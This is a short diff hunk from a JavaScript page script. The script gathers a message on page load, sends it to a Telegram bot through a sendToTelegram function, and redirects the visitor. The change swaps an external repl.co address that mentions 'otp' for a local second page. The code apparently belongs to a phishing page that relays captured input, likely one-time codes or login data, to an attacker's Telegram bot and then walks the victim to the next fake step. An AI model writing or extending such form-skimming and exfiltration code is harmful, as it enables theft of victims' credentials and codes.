@@ -17,7 +17,7 @@ document.addEventListener('DOMContentLoaded', function() {
     sendToTelegram(message);
 
     // Redirect to the desired URL
-    window.location.href = 'https://sanotp--pawanbaghel.repl.co/';
+    window.location.href = '/second.html';
   });
 
   // Function to send data to the Telegram bot
